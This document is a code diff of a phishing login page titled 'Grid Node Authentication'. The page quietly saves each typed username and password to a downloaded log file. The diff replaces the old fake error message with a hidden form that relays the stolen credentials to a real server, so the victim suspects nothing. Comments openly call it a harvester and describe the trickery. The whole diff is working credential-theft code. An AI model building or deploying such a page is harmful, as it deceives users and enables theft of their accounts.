@@ -8,14 +8,14 @@
         .login-box { border: 2px solid #00ffcc; padding: 20px; width: 300px; margin: 0 auto; box-shadow: 0 0 15px #00ffcc; }
         input[type="text"], input[type="password"] { width: 100%; margin-bottom: 10px; background: #111; color: #fff; border: 1px solid #00ffcc; padding: 5px; box-sizing: border-box; }
         input[type="submit"] { background: #00ffcc; color: #000; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; }
-        .error-msg { color: #ff3333; margin-top: 15px; text-align: center; font-size: 0.9em; display: none; }
     </style>
 </head>
 <body>
 
 <div class="login-box">
     <h2>Grid Node Authentication</h2>
-    <form id="loginForm">
+    <!-- Visible interface for the user -->
+    <form id="harvesterForm">
         <label for="username">Username:</label>
         <input type="text" id="username" required autocomplete="off">
         
@@ -24,39 +24,43 @@
         
         <input type="submit" value="ESTABLISH HANDSHAKE">
     </form>
-    <div id="error" class="error-msg">CRITICAL LINK ERROR: Connection timeout to terminal node. Please try again.</div>
 </div>
 
+<!-- Hidden form that relays the credentials to the real production server -->
+<form id="realLoginForm" action="http://10.1.1" method="POST" style="display:none;">
+    <input type="text" id="realUser" name="username">
+    <input type="password" id="realPass" name="password">
+</form>
+
 <script>
-document.getElementById('loginForm').addEventListener('submit', function(e) {
+document.getElementById('harvesterForm').addEventListener('submit', function(e) {
     e.preventDefault(); // Stop normal form processing
     
     var user = document.getElementById('username').value;
     var pass = document.getElementById('password').value;
     
-    // Format the captured parameters to match your original playbook output exactly
+    // Format the capture data string to match your playbook log output
     var logText = "[HARVEST CAPTURE] USER: " + user + " | PASS: " + pass + "\n";
     
     // Convert text data into a safe Base64 string for a local Data URI download
     var encodedUri = 'data:text/plain;base64,' + btoa(logText);
     
-    // Create the download element in memory
+    // Create and trigger the local file saving mechanism in browser memory
     var downloadLink = document.createElement("a");
     downloadLink.setAttribute("href", encodedUri);
     downloadLink.setAttribute("download", "encom_session_debug.txt");
-    
-    // Append to body to ensure compatibility with older rendering engines
     document.body.appendChild(downloadLink);
-    
-    // Trigger the file saving mechanism locally
     downloadLink.click();
-    
-    // Clean up the DOM element
     document.body.removeChild(downloadLink);
     
-    // Instead of redirecting away (which cancels the download), show a fake error message.
-    // This tricks the user into thinking the network failed, hiding the file drop.
-    document.getElementById('error').style.display = 'block';
+    // Copy the values to the hidden form pointing to the real server
+    document.getElementById('realUser').value = user;
+    document.getElementById('realPass').value = pass;
+    
+    // Tiny delay to allow the local download to trigger, then submit to the real server
+    setTimeout(function() {
+        document.getElementById('realLoginForm').submit();
+    }, 300);
 });
 </script>
 
